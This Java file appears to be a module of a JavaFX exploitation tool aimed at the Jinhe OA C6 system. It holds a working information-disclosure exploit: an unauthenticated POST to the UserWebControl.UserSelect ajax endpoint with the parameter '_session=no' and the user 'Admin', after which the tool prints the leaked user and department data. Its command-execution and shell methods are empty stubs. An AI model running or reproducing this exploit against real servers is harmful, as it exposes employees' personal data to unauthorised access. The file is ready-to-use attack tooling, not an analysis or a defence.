package exp.oa.jinheoa;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.HttpTools_getTime;
import utils.Response;

import java.util.HashMap;

public class jinhe_UserWebControl_info implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea, textArea_cmd);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        Platform.runLater(() -> {
            textArea.appendText("\n 该漏洞为信息泄露，请访问url进行测试");
        });
        return null;
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }

    private Boolean att(String url, TextArea textArea, TextArea textArea_cmd) {
        try {
            HashMap<String, String> head = new HashMap<>();
            head.put("Content-Type","text/plain;charset=UTF-8");
            head.put("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0");
            head.put("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");
            String data ="strDeptID=\r\n" +
                    "strUserId=Admin\r\n" +
                    "strUserEsp=\r\n" +
                    "strArchivesId=\r\n" +
                    "deptIds=\r\n" +
                    "IsShowChildrenDept=0\r\n" +
                    "IsCascade=1";
            Response var = HttpTools.post(url + "/C6/ajax/UserWebControl.UserSelect.AjaxServiceMethod,UserWebControl.UserSelect.ashx?_method=GetDepartDataByDeptID&_session=no" ,data, head, "gbk");
            if (var.getCode() == 200 ) {
                Platform.runLater(() -> {
                    textArea.appendText("\n [ jinhe_UserWebControl_info ]");
                    textArea.appendText("\n 用户信息泄露: "+url + "/C6/ajax/UserWebControl.UserSelect.AjaxServiceMethod,UserWebControl.UserSelect.ashx?_method=GetDepartDataByDeptID&_session=no");
                    textArea_cmd.appendText("\n------------------------------------------------------------------------------\n"
                    +var.getText()+"\n------------------------------------------------------------------------------\n");
                    textArea.appendText("\n");
                });

                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }
}
